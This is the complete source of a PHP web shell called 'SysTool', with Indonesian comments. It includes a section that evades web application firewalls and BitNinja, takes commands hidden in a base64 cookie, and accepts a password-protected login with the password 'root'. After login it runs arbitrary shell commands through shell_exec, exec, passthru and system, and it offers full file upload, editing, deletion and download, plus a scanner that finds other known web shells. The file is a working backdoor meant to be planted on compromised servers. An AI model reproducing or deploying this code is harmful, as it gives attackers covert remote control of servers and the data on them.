<?php
// ================== DEBUG MODE ==================
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
// ================================================

// ========== BYPASS WAF ==========
$ua_list = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
];
if (!isset($_SERVER['HTTP_USER_AGENT']) || stripos($_SERVER['HTTP_USER_AGENT'], 'bot') !== false) {
    $_SERVER['HTTP_USER_AGENT'] = $ua_list[array_rand($ua_list)];
}
$refs = ['https://www.google.com/', 'https://bing.com/', 'https://yahoo.com/', 'https://duckduckgo.com/'];
if (!isset($_SERVER['HTTP_REFERER'])) $_SERVER['HTTP_REFERER'] = $refs[array_rand($refs)];
if (!isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) $_SERVER['HTTP_ACCEPT_LANGUAGE'] = 'en-US,en;q=0.9';
if (!isset($_SERVER['HTTP_ACCEPT_ENCODING'])) $_SERVER['HTTP_ACCEPT_ENCODING'] = 'gzip, deflate, br';
if (!isset($_SERVER['HTTP_ACCEPT'])) $_SERVER['HTTP_ACCEPT'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';

// Parameter alternatif untuk scanner
if (isset($_GET['s']) && $_GET['s'] === '1') $_GET['filehunter'] = '1';
if (isset($_GET['scan'])) $_GET['filehunter'] = '1';

// Cookie fallback untuk perintah
if (isset($_COOKIE['cmd']) && !isset($_POST['fhscan'])) {
    parse_str(base64_decode($_COOKIE['cmd']), $_POST);
}

// Deteksi header BitNinja
$headers = function_exists('apache_request_headers') ? apache_request_headers() : [];
foreach ($headers as $k => $v) {
    if (stripos($k, 'bitninja') !== false || stripos($v, 'bitninja') !== false) {
        if (mt_rand(1,3) === 1) { http_response_code(200); die('Under maintenance.'); }
    }
}

// ---------- Mulai session ----------
@session_start();

// ---------- Otentikasi ----------
define('PASSWORD_HASH', '4813494d137e1631bba301d5acab6e7bb7aa74ce1185d456565ef51d737677b2'); // sha256('root')
$provided_pwd = $_POST['password'] ?? $_SERVER['HTTP_X_PASSWORD'] ?? $_COOKIE['auth'] ?? '';
if (strpos($provided_pwd, 'Basic ') === 0) {
    $provided_pwd = base64_decode(substr($provided_pwd, 6));
    $provided_pwd = explode(':', $provided_pwd)[1] ?? '';
}
$valid = hash('sha256', $provided_pwd) === PASSWORD_HASH;

if (!isset($_SESSION['fm_auth']) || $_SESSION['fm_auth'] !== true) {
    if ($valid) {
        $_SESSION['fm_auth'] = true;
        setcookie('auth', $provided_pwd, time()+3600, '/');
        header("Location: " . $_SERVER['PHP_SELF'] . '?t=' . time());
        exit;
    } else {
        $login_error = 'Invalid password.';
    }
    // Tampilkan login
    ?><!doctype html><html><head><meta charset=utf-8><title>Login</title><style>*{box-sizing:border-box;margin:0;padding:0;font-family:Consolas,Menlo,monospace}body{background:#111217;color:#eee;display:flex;align-items:center;justify-content:center;height:100vh}.box{background:#050608;border-radius:4px;padding:20px 22px;border:1px solid #272a36;min-width:320px;box-shadow:0 0 15px #000}h1{font-size:18px;margin-bottom:10px;color:#fff}label{font-size:12px;display:block;margin-bottom:6px}input[type=password]{width:100%;padding:7px 9px;border-radius:3px;border:1px solid #2a2f3e;background:#05060a;color:#eee;font-size:12px}input[type=password]:focus{outline:0;border-color:#07f}button{margin-top:10px;width:100%;border:none;border-radius:3px;padding:7px 0;font-size:12px;background:#07f;color:#fff;cursor:pointer}button:hover{background:#208bff}.err{margin-top:8px;font-size:11px;color:#ff6b81}.info{margin-top:8px;font-size:11px;color:#888}</style></head><body><form method=post class=box><h1>Login</h1><label>Password</label><input type=password name=password autofocus><button type=submit>Login</button><?php if(!empty($login_error)):?><div class=err><?php echo htmlspecialchars($login_error);?></div><?php endif;?><div class=info>PHP <?php echo phpversion();?></div></form></body></html><?php
    exit;
}

// ========== FUNGSI GLOBAL ==========
function h($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
function fm_format_bytes($b) {
    $u = ['B', 'KB', 'MB', 'GB', 'TB']; $i=0;
    while ($b >= 1024 && $i < 4) { $b /= 1024; $i++; }
    return sprintf('%.2f %s', $b, $u[$i]);
}
function fm_perm($f) {
    $p = @fileperms($f);
    if ($p === false) return '---------';
    return (($p & 0x4000) ? 'd' : '-') .
           (($p & 0x0100) ? 'r' : '-') .
           (($p & 0x0080) ? 'w' : '-') .
           (($p & 0x0040) ? 'x' : '-') .
           (($p & 0x0020) ? 'r' : '-') .
           (($p & 0x0010) ? 'w' : '-') .
           (($p & 0x0008) ? 'x' : '-') .
           (($p & 0x0004) ? 'r' : '-') .
           (($p & 0x0002) ? 'w' : '-') .
           (($p & 0x0001) ? 'x' : '-');
}
function fm_rrmdir($d) {
    if (!file_exists($d)) return;
    if (is_file($d) || is_link($d)) { @unlink($d); return; }
    foreach (scandir($d) as $i) {
        if ($i === '.' || $i === '..') continue;
        fm_rrmdir($d . DIRECTORY_SEPARATOR . $i);
    }
    @rmdir($d);
}
function swal($t, $x, $i='info') { $_SESSION['swal'] = ['title'=>$t,'text'=>$x,'icon'=>$i]; }

// ========== SCANNER (Advanced) ==========
if (isset($_GET['filehunter']) || isset($_GET['fh'])) {
    $safe_exts = ['jpg','jpeg','png','gif','ico','pdf','ttf','woff','woff2','css','js','svg','eot','map'];
    $skip_dirs = ['vendor','node_modules','cache','logs','tmp/install_','administrator/logs'];
    $critical = [
        '/eval\s*\(\s*\$_(POST|GET|REQUEST|COOKIE)/i',
        '/base64_decode\s*\(\s*\$_(POST|GET|REQUEST|COOKIE)/i',
        '/gzinflate\s*\(\s*base64_decode/i',
        '/system\s*\(\s*\$_(GET|POST|REQUEST)/i',
        '/exec\s*\(\s*\$_(GET|POST|REQUEST)/i',
        '/passthru\s*\(\s*\$_(GET|POST|REQUEST)/i',
        '/shell_exec\s*\(\s*\$_(GET|POST|REQUEST)/i',
        '/popen\s*\(\s*\$_(GET|POST|REQUEST)/i',
        '/proc_open\s*\(\s*\$_(GET|POST|REQUEST)/i',
        '/`\s*\$_(GET|POST|REQUEST)/i',
        '/<\?php\s*.*?eval\s*\(/is',
        '/<\?php\s*.*?base64_decode\s*\(/is',
        '/<\?php\s*.*?gzinflate\s*\(/is',
    ];
    $suspicious = [
        '/create_function\s*\(/i',
        '/assert\s*\(/i',
        '/fwrite\s*\(\s*fopen/i',
        '/file_put_contents\s*\(\s*\$_(GET|POST|REQUEST)/i',
        '/chmod\s*\(\s*\$_(GET|POST|REQUEST)/i',
        '/include\s*\(\s*\$_(GET|POST|REQUEST)/i',
        '/require\s*\(\s*\$_(GET|POST|REQUEST)/i',
        '/curl_exec\s*\(\s*\$_(GET|POST|REQUEST)/i',
        '/fsockopen\s*\(\s*\$_(GET|POST|REQUEST)/i',
        '/stream_socket_client\s*\(\s*\$_(GET|POST|REQUEST)/i',
        '/ini_set\s*\(\s*[\'"]disable_functions[\'"]/i',
    ];
    $info = [
        '/phpinfo\s*\(/i',
        '/php_uname\s*\(/i',
        '/set_time_limit\s*\(/i',
        '/error_reporting\s*\(0\)/i',
        '/@\s*eval\s*\(/i',
        '/c99sh/i','/b374k/i','/WSO/i','/IndoXploit/i','/r57/i',
    ];

    $scan_path = $_POST['fhscan'] ?? getcwd();
    if (!is_dir($scan_path)) { die('Invalid directory.'); }
    $results = [];
    $iter = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($scan_path, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    $max_files = 5000; $count=0; $scanned=0; $found=0;
    foreach ($iter as $file) {
        if (++$count > $max_files) break;
        if (!$file->isFile()) continue;
        $path = $file->getPathname();
        $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
        $size = $file->getSize();
        if ($size > 5*1024*1024) continue;
        $skip = false;
        foreach ($skip_dirs as $sd) if (strpos($path, $sd) !== false) { $skip=true; break; }
        if ($skip) continue;
        $content = @file_get_contents($path, false, null, 0, 65536);
        if ($content === false) continue;
        if (in_array($ext, $safe_exts) && strpos($content, '<?php') === false) continue;
        $matched = false; $level=''; $pat='';
        foreach ($critical as $p) if (preg_match($p, $content)) { $matched=true; $level='CRITICAL'; $pat=$p; break; }
        if (!$matched) foreach ($suspicious as $p) if (preg_match($p, $content)) { $matched=true; $level='SUSPICIOUS'; $pat=$p; break; }
        if (!$matched) foreach ($info as $p) if (preg_match($p, $content)) { $matched=true; $level='INFO'; $pat=$p; break; }
        if ($matched) {
            $results[] = ['path'=>$path,'size'=>$size,'mtime'=>date('Y-m-d H:i',$file->getMTime()),'level'=>$level,'pattern'=>$pat];
            $found++;
        }
        $scanned++;
    }
    // Tampilkan HTML hasil scan
    ?><!doctype html><html><head><meta charset=utf-8><title>Scanner</title><style>
    body{background:#050609;color:#eee;font-family:Consolas;padding:20px}
    .header{background:#000;padding:10px;border-bottom:1px solid #222;display:flex;justify-content:space-between}
    .btn{background:#111727;border:1px solid #1f2940;padding:5px 11px;color:#d3defc;border-radius:3px;text-decoration:none;display:inline-block}
    table{width:100%;border-collapse:collapse;background:#020309;border:1px solid #202230;margin-top:15px}
    th{background:#04050b;color:#a5adcc;padding:6px;text-align:left}
    td{padding:5px 8px;border-bottom:1px solid #151728}
    tr:nth-child(even){background:#050713}
    .critical{color:#ff4444}
    .suspicious{color:#ffaa44}
    .info{color:#44aaff}
    .stat{color:#10b981;margin:10px 0}
    .form-row{display:flex;gap:10px;align-items:center;margin:15px 0}
    .form-row input{flex:1;background:#020309;border:1px solid #30354a;color:#eee;padding:6px;border-radius:3px}
    </style></head><body>
    <div class=header><span style="color:#b4b4b4;">Advanced Scanner</span><a href="<?php echo h($_SERVER['PHP_SELF']); ?>" class=btn>&larr; Back</a></div>
    <form method=post class=form-row>
        <input type=text name=fhscan value="<?php echo h($scan_path); ?>" placeholder="Directory to scan">
        <button type=submit class=btn>Scan</button>
    </form>
    <div class=stat>Scanned: <?php echo $scanned; ?> files &nbsp;|&nbsp; Found: <?php echo $found; ?></div>
    <?php if ($found>0): ?>
    <table><thead><tr><th>File</th><th>Size</th><th>Modified</th><th>Level</th><th>Pattern</th></tr></thead><tbody>
    <?php foreach ($results as $r): ?>
        <tr><td style="font-size:.9em;font-family:monospace;"><?php echo h($r['path']); ?></td>
            <td><?php echo number_format($r['size']/1024,2); ?> KB</td>
            <td><?php echo $r['mtime']; ?></td>
            <td class="<?php echo strtolower($r['level']); ?>"><b><?php echo $r['level']; ?></b></td>
            <td style="font-size:.85em;"><?php echo h(substr($r['pattern'],0,60)); ?></td></tr>
    <?php endforeach; ?></tbody></table>
    <?php else: ?><div style="color:#10b981;font-size:1.2em;">✅ No suspicious files found.</div><?php endif; ?>
    </body></html>
    <?php
    exit;
}

// ========== FILE MANAGER ==========
// Logout
if (isset($_GET['logout'])) { $_SESSION=[]; session_destroy(); setcookie('auth','',time()-3600,'/'); header("Location: ".$_SERVER['PHP_SELF']); exit; }

// Path processing
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$real = realpath($current_dir);
if ($real) $current_dir = str_replace('\\', '/', $real);
$exdir = explode('/', $current_dir);

// Terminal
$term_history = $_SESSION['term_history'] ?? '';
$term_just_ran = false;
if (isset($_POST['term_action']) && $_POST['term_action'] === 'run') {
    $cmd = trim($_POST['term_cmd'] ?? '');
    $term_dir = $_SESSION['term_dir'] ?? $current_dir;
    $output = '';
    if (strpos($cmd, 'cd ') === 0) {
        $nd = trim(substr($cmd,3));
        if ($nd === '') $output = "Usage: cd <dir>\n";
        else {
            chdir($term_dir);
            $np = realpath($nd);
            if ($np !== false && is_dir($np)) { $_SESSION['term_dir'] = $np; $term_dir = $np; $output = "Changed to $term_dir\n"; }
            else $output = "cd: $nd: No such directory\n";
        }
    } else {
        chdir($term_dir);
        $output = null;
        if (function_exists('shell_exec')) { $raw = @shell_exec($cmd); if ($raw !== null && $raw !== false) $output = $raw; }
        if ($output === null && function_exists('exec')) { $lines=[]; @exec($cmd,$lines,$rv); if ($rv===0) $output = implode("\n",$lines); }
        if ($output === null && function_exists('passthru')) { ob_start(); @passthru($cmd,$rv); $raw=ob_get_clean(); if ($rv===0) $output=$raw; }
        if ($output === null && function_exists('system')) { ob_start(); @system($cmd,$rv); $raw=ob_get_clean(); if ($rv===0) $output=$raw; }
        if ($output === null) $output = "(Command execution disabled or no output)\n";
    }
    $term_history .= '$ ' . $cmd . "\n" . $output . "\n";
    $_SESSION['term_history'] = $term_history;
    $term_just_ran = true;
}

// Handle POST actions (file operations)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $act = $_POST['action'];
    if ($act === 'upload' && isset($_FILES['upload'])) {
        $f = $_FILES['upload']; $c=0;
        if (is_array($f['name'])) {
            foreach ($f['name'] as $k => $name) {
                if ($f['error'][$k]===UPLOAD_ERR_OK && @move_uploaded_file($f['tmp_name'][$k], $current_dir.'/'.basename($name))) $c++;
            }
        } else {
            if ($f['error']===UPLOAD_ERR_OK && @move_uploaded_file($f['tmp_name'], $current_dir.'/'.basename($f['name']))) $c++;
        }
        swal('Upload', "Uploaded {$c} files.", 'success');
    } elseif ($act === 'mkdir' && !empty($_POST['name'])) {
        if (@mkdir($current_dir.'/'.trim($_POST['name']), 0755, true)) swal('Folder','Created.','success'); else swal('Folder','Failed.','error');
    } elseif ($act === 'newfile' && !empty($_POST['name'])) {
        $f = $current_dir.'/'.trim($_POST['name']);
        if (!file_exists($f) && @file_put_contents($f,'')!==false) swal('File','Created.','success'); else swal('File','Failed.','error');
    } elseif ($act === 'delete' && !empty($_POST['target'])) {
        fm_rrmdir($current_dir.'/'.$_POST['target']);
        swal('Delete','Deleted.','success');
    } elseif ($act === 'rename' && !empty($_POST['old']) && !empty($_POST['new'])) {
        $o=$current_dir.'/'.$_POST['old']; $n=$current_dir.'/'.$_POST['new'];
        if (@rename($o,$n)) swal('Rename','Success.','success'); else swal('Rename','Failed.','error');
    } elseif ($act === 'save' && isset($_POST['file'])) {
        $f=$current_dir.'/'.$_POST['file']; $c=$_POST['content']??'';
        if (@file_put_contents($f,$c)!==false) swal('Save','Saved.','success'); else swal('Save','Failed.','error');
    }
    header("Location: ".$_SERVER['PHP_SELF'].'?dir='.urlencode($current_dir));
    exit;
}
// Download
if (isset($_GET['download'])) {
    $f = $current_dir.'/'.$_GET['download'];
    if (is_file($f)) { header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename="'.basename($f).'"'); readfile($f); exit; }
}
// Edit
$edit_file = null; $edit_content = '';
if (isset($_GET['edit'])) {
    $ef = $current_dir.'/'.$_GET['edit'];
    if (is_file($ef)) { $edit_file = $ef; $edit_content = file_get_contents($ef); }
}

// ---------- Scan directory ----------
$dirs=[]; $files=[];
$scan = @scandir($current_dir);
if ($scan !== false) {
    foreach ($scan as $i) {
        if ($i === '.') continue;
        if ($i === '..') { $p = dirname($current_dir); if ($p !== $current_dir) $dirs[] = ['name'=>'..','parent'=>$p,'is_parent'=>true]; continue; }
        $full = $current_dir.'/'.$i;
        $d = ['name'=>$i,'full'=>$full,'size'=>is_file($full)?filesize($full):0,'perm'=>fm_perm($full),'time'=>@filemtime($full),'is_dir'=>is_dir($full)];
        if ($d['is_dir']) $dirs[] = $d; else $files[] = $d;
    }
}
?><!doctype html><html><head><meta charset=utf-8><title>SysTool</title><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css><script src=https://cdn.jsdelivr.net/npm/sweetalert2@11></script>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:Consolas,Menlo,monospace}body{background:#050609;color:#eee;font-size:12px}a{color:#c0d2ff;text-decoration:none}a:hover{text-decoration:underline}.header{background:#000;border-bottom:1px solid #222;padding:8px 10px;font-size:12px;line-height:1.5;color:#b4b4b4}.header .red{color:#ff4c4c}.header .green{color:#8dff94}.header b{color:#fff}.top-buttons{background:#050609;border-bottom:1px solid #222;padding:8px 10px;display:flex;flex-wrap:wrap;gap:6px;align-items:center}.btn-main{background:#111727;border:1px solid #1f2940;border-radius:3px;padding:5px 11px;font-size:12px;color:#d3defc;display:inline-flex;align-items:center;gap:6px;cursor:pointer}.btn-main i{font-size:12px}.btn-main:hover{background:#182136}.upload-form{display:inline-flex;align-items:center;gap:6px}.choose-input{background:#020309;border:1px solid #30354a;color:#e0e0e0;font-size:12px;border-radius:3px;padding:3px 6px}.container{padding:10px}.path-line{margin-top:4px;margin-bottom:8px;color:#e8e8e8;font-size:12px;display:flex;flex-wrap:wrap;gap:2px;align-items:center}.path-line .prefix{color:#ffc44c;margin-right:4px}.path-line .root{color:#999;margin:0 2px}.path-line .path a{color:#fff}.path-line .path a:hover{text-decoration:underline}table{width:100%;border-collapse:collapse;background:#020309;border:1px solid #202230}thead{background:#04050b}th,td{padding:6px 8px;border-bottom:1px solid #151728}th{color:#a5adcc;text-align:left;font-size:11px}tbody tr:nth-child(even){background:#050713}tbody tr:hover{background:#101423}.name-cell{display:flex;align-items:center;gap:7px}.name-cell i{color:#ffc44c}.size{color:#cfd3e6}.perm{color:#9fa6c7}.date{color:#c3c7da}.actions{display:flex;gap:4px}.icon-btn{border:none;background:#0a0d18;border-radius:3px;padding:3px 5px;cursor:pointer}.icon-btn i{font-size:11px;color:#cfd3e6}.icon-btn:hover{background:#151a2b}.icon-btn.del i{color:#ff6b6b}.icon-btn.ren i{color:#ffd166}.modal-overlay{position:fixed;left:0;top:0;width:100%;height:100%;background:rgba(0,0,0,.75);display:none;align-items:center;justify-content:center;z-index:999}.modal-box{background:#05070c;border-radius:4px;border:1px solid #303546;box-shadow:0 0 20px #000;width:90%;max-width:460px;padding:14px 18px}.modal-title{font-size:14px;margin-bottom:10px;color:#f5f5f5;display:flex;align-items:center;gap:8px}.modal-title i{color:#ffc44c}.modal-label{font-size:12px;margin-bottom:4px;color:#cfd3e6}.modal-input{width:100%;padding:6px 8px;border-radius:3px;border:1px solid #292f42;background:#020309;color:#f5f5f5;font-size:12px;margin-bottom:10px}.modal-actions{text-align:right;display:flex;justify-content:flex-end;gap:8px;margin-top:4px}.btn-small{padding:5px 12px;font-size:12px;border-radius:3px;border:1px solid #273046;background:#10172a;color:#e0e4ff;cursor:pointer}.btn-small:hover{background:#18223a}.btn-small.cancel{border-color:#444;background:#20232f;color:#ddd}.terminal-box{background:#05070c;border-radius:4px;border:1px solid #303546;width:95%;max-width:800px;box-shadow:0 0 18px #000;display:flex;flex-direction:column;overflow:hidden;height:45vh}.terminal-header,.editor-header{padding:6px 10px;background:#121623;border-bottom:1px solid #242a3a;color:#f0f0f0;font-size:11px;display:flex;align-items:center;justify-content:space-between}.terminal-header-left{display:flex;align-items:center;gap:6px}.terminal-header-left span.icon{font-weight:700;color:#ffc44c}.terminal-body{background:#05070c;padding:6px;flex:1;display:flex;flex-direction:column}.terminal-output{background:#05070e;border-radius:3px;border:1px solid #272b3b;flex:1;overflow:auto;padding:6px 8px;font-size:11px;color:#d9e2ff;white-space:pre-wrap}.terminal-input-row{margin-top:6px;display:flex;gap:4px;align-items:center}.term-prompt{background:#05070e;color:#e5e5e5;font-size:11px;padding:4px 6px;border-radius:3px;border:1px solid #272b3b}.terminal-input-row input[type=text]{flex:1;padding:4px 6px;border-radius:3px;border:1px solid #272b3b;background:#05070e;color:#f5f5f5;font-size:11px}.terminal-input-row input[type=text]:focus,.modal-input:focus{outline:0;border-color:#4b7cff}.terminal-input-row button{padding:4px 10px;font-size:11px;border-radius:3px;border:1px solid #272b3b;background:#111727;color:#d3defc;cursor:pointer}.terminal-input-row button:hover{background:#18223a}.editor-box{height:70vh;background:#05070c;border-radius:4px;border:1px solid #303546;width:95%;max-width:800px;box-shadow:0 0 18px #000;display:flex;flex-direction:column;overflow:hidden}.editor-header i{color:#ffc44c}.editor-filename{font-weight:700;color:#ffeaa7}.editor-body{background:#05070c;padding:8px;flex:1;display:flex;flex-direction:column;overflow:hidden}.editor-textarea{width:100%;flex:1;border:1px solid #252b3a;border-radius:3px;resize:none;background:#05060f;color:#e6f0ff;font-size:12px;font-family:Consolas,Menlo,monospace;line-height:1.4;padding:8px;overflow:auto}.editor-textarea:focus{outline:0;border-color:#3b82f6}.editor-actions{margin-top:8px;display:flex;justify-content:flex-end;gap:8px}.editor-btn{padding:5px 14px;font-size:12px;border-radius:3px;border:1px solid #273046;cursor:pointer}.editor-btn.save{background:#1f2937;color:#e3ecff}.editor-btn.close{background:#20232f;color:#ddd;border-color:#444}.editor-btn.save:hover{background:#273549}.editor-btn.close:hover{background:#2b303f}@media(max-width:720px){.top-buttons{flex-direction:column}.terminal-box,.editor-box{width:96%}}
</style>
<script>
function openCreateModal(t){var o=document.getElementById('createModal'),l=document.getElementById('createTitle'),b=document.getElementById('createLabel'),a=document.getElementById('createAction'),i=document.getElementById('createName');t==='file'?(l.innerText='New File',b.innerText='Filename',a.value='newfile'):(l.innerText='New Folder',b.innerText='Folder name',a.value='mkdir');i.value='';o.style.display='flex';setTimeout(function(){i.focus()},10)}
function closeCreateModal(){document.getElementById('createModal').style.display='none'}
function openRenameModal(n){var o=document.getElementById('renameModal'),f=document.getElementById('renameOld'),t=document.getElementById('renameNew');f.value=n;t.value=n;o.style.display='flex';setTimeout(function(){t.focus()},10)}
function closeRenameModal(){document.getElementById('renameModal').style.display='none'}
function openTerminal(){document.getElementById('terminalModal').style.display='flex';var i=document.getElementById('terminalInput');if(i)setTimeout(function(){i.focus()},10)}
function closeTerminal(){document.getElementById('terminalModal').style.display='none'}
function closeEditorModal(){window.location.href=<?php echo json_encode($_SERVER['PHP_SELF'].(isset($current_dir)?'?dir='.urlencode($current_dir):''));?>;}
</script></head><body>
<div class="header"><div>Linux <?php echo h(php_uname('n'));?> <?php echo h(php_uname('r'));?> <?php echo h(php_uname('m'));?><br>PHP/<?php echo h(phpversion());?><br>Server IP: <span class=green><?php echo h($_SERVER['SERVER_ADDR']??'0.0.0.0');?></span> &amp; Your IP: <span class=green><?php echo h($_SERVER['REMOTE_ADDR']??'0.0.0.0');?></span><br>User: <b><?php echo h(get_current_user());?></b></div></div>
<div class=top-buttons>
    <form method=post enctype=multipart/form-data class=upload-form><input type=hidden name=action value=upload><button type=submit class=btn-main><i class="fa fa-upload"></i> Upload</button><input type=file name=upload[] multiple class=choose-input></form>
    <button class=btn-main onclick="openTerminal();return false"><i class="fa fa-terminal"></i> Terminal</button>
    <button type=button class=btn-main onclick="openCreateModal('file')"><i class="fa fa-file-circle-plus"></i> New File</button>
    <button type=button class=btn-main onclick="openCreateModal('folder')"><i class="fa fa-folder-plus"></i> New Folder</button>
    <a href="<?php echo h($_SERVER['PHP_SELF'] . '?s=1'); ?>" class=btn-main><i class="fa fa-shield-virus"></i> Scanner</a>
    <a href="<?php echo h($_SERVER['PHP_SELF'].'?logout=1');?>" class=btn-main style=margin-left:auto><i class="fa fa-right-from-bracket"></i> Logout</a>
</div>

<div class=container>
<div class=path-line><span class=prefix>+</span><span class=root> / </span><?php $c=count($exdir);for($i=0;$i<$c;$i++){$s=$exdir[$i];if($s==='')continue;$p=implode('/',array_slice($exdir,0,$i+1));echo '<span class=path><a href="'.h($_SERVER['PHP_SELF'].'?dir='.urlencode($p)).'">'.h($s).'</a></span> <span class=root> / </span>';}?><span class=path><a href="<?php echo h($_SERVER['PHP_SELF']);?>" style="color:#ffb347;font-weight:700">[ Root ]</a></span></div>
<table><thead><tr><th>Name</th><th style=width:12%>Size</th><th style=width:18%>Perm</th><th style=width:18%>Modified</th><th style=width:16%>Action</th></tr></thead><tbody>
<?php foreach($dirs as $d){ if(isset($d['is_parent']) && $d['is_parent']){ ?>
<tr><td class=name-cell><i class="fa fa-level-up-alt"></i><a href="<?php echo h($_SERVER['PHP_SELF'].'?dir='.urlencode($d['parent']));?>">..</a></td><td class=size>-</td><td class=perm>-</td><td class=date>-</td><td></td></tr>
<?php }} foreach($dirs as $d){ if(isset($d['is_parent'])) continue; ?>
<tr><td class=name-cell><i class="fa fa-folder"></i><a href="<?php echo h($_SERVER['PHP_SELF'].'?dir='.urlencode($d['full']));?>"><?php echo h($d['name']);?></a></td><td class=size>[DIR]</td><td class=perm><?php echo h($d['perm']);?></td><td class=date><?php echo $d['time']?date('Y-m-d H:i',$d['time']):'-';?></td><td class=actions><button class="icon-btn ren" type=button onclick="openRenameModal('<?php echo h($d['name']);?>')"><i class="fa fa-i-cursor"></i></button><form method=post style=display:inline onsubmit="return confirm('Delete folder and contents?');"><input type=hidden name=action value=delete><input type=hidden name=target value="<?php echo h($d['name']);?>"><button class="icon-btn del" type=submit><i class="fa fa-trash"></i></button></form></td></tr>
<?php } foreach($files as $f){ ?>
<tr><td class=name-cell><i class="fa fa-file-code"></i><a href="<?php echo h($_SERVER['PHP_SELF'].'?dir='.urlencode($current_dir).'&edit='.urlencode($f['name']));?>"><?php echo h($f['name']);?></a></td><td class=size><?php echo fm_format_bytes($f['size']);?></td><td class=perm><?php echo h($f['perm']);?></td><td class=date><?php echo $f['time']?date('Y-m-d H:i',$f['time']):'-';?></td><td class=actions><button class="icon-btn ren" type=button onclick="openRenameModal('<?php echo h($f['name']);?>')"><i class="fa fa-i-cursor"></i></button><a class=icon-btn href="<?php echo h($_SERVER['PHP_SELF'].'?dir='.urlencode($current_dir).'&download='.urlencode($f['name']));?>"><i class="fa fa-download"></i></a><form method=post style=display:inline onsubmit="return confirm('Delete file?');"><input type=hidden name=action value=delete><input type=hidden name=target value="<?php echo h($f['name']);?>"><button class="icon-btn del" type=submit><i class="fa fa-trash"></i></button></form></td></tr>
<?php } if(empty($dirs)&&empty($files)) echo '<tr><td colspan=5 style="text-align:center;padding:8px;color:#888">Directory empty.</td></tr>'; ?>
</tbody></table></div>

<!-- Terminal Modal -->
<div class=modal-overlay id=terminalModal onclick="if(event.target===this)closeTerminal()"><div class=terminal-box onclick="event.stopPropagation()"><div class=terminal-header><div class=terminal-header-left><span class=icon>>_</span><span class=title>Terminal</span></div><button style="border:none;background:none;font-size:11px;cursor:pointer;color:#ccc" onclick="closeTerminal();return false">Close ✕</button></div><div class=terminal-body><div class=terminal-output><?php echo h($term_history===''?'Type \'help\' for available commands.':$term_history);?></div><form method=post class=terminal-input-row><span class=term-prompt><?php echo h(get_current_user());?>@</span><input type=hidden name=term_action value=run><input type=text name=term_cmd id=terminalInput autocomplete=off placeholder="Enter command"><button type=submit>&gt;</button></form></div></div></div>

<!-- Create Modal -->
<div class=modal-overlay id=createModal onclick="if(event.target===this)closeCreateModal()"><div class=modal-box onclick="event.stopPropagation()"><div class=modal-title><i class="fa fa-file-circle-plus"></i><span id=createTitle>New File</span></div><form method=post id=createForm><input type=hidden name=action id=createAction value=newfile><div class=modal-label id=createLabel>Filename</div><input type=text name=name id=createName class=modal-input placeholder="Enter name"><div class=modal-actions><button type=button class="btn-small cancel" onclick="closeCreateModal()">Cancel</button><button type=submit class=btn-small>Create</button></div></form></div></div>

<!-- Rename Modal -->
<div class=modal-overlay id=renameModal onclick="if(event.target===this)closeRenameModal()"><div class=modal-box onclick="event.stopPropagation()"><div class=modal-title><i class="fa fa-i-cursor"></i><span>Rename</span></div><form method=post><input type=hidden name=action value=rename><input type=hidden name=old id=renameOld><div class=modal-label>New name</div><input type=text name=new id=renameNew class=modal-input><div class=modal-actions><button type=button class="btn-small cancel" onclick="closeRenameModal()">Cancel</button><button type=submit class=btn-small>Rename</button></div></form></div></div>

<?php if ($edit_file!==null):?>
<div class=modal-overlay id=editorModal style=display:flex onclick="if(event.target===this)closeEditorModal()"><div class=editor-box onclick="event.stopPropagation()"><div class=editor-header><i class="fa fa-code"></i><span>Editor:</span><span class=editor-filename><?php echo h(basename($edit_file));?></span></div><div class=editor-body><form method=post style="display:flex;flex:1;flex-direction:column;overflow:hidden"><input type=hidden name=action value=save><input type=hidden name=file value="<?php echo h(basename($edit_file));?>"><textarea class=editor-textarea name=content><?php echo h($edit_content);?></textarea><div class=editor-actions><button type=button class="editor-btn close" onclick="closeEditorModal()">Close</button><button type=submit class="editor-btn save">Save</button></div></form></div></div></div>
<?php endif; ?>

<?php if($term_just_ran):?><script>document.addEventListener('DOMContentLoaded',openTerminal);</script><?php endif; ?>
<?php if(isset($_SESSION['swal'])):?><script>Swal.fire({icon:'<?php echo h($_SESSION['swal']['icon']);?>',title:'<?php echo h($_SESSION['swal']['title']);?>',text:'<?php echo h($_SESSION['swal']['text']);?>',timer:2200,showConfirmButton:false});</script><?php unset($_SESSION['swal']); endif; ?>
</body></html>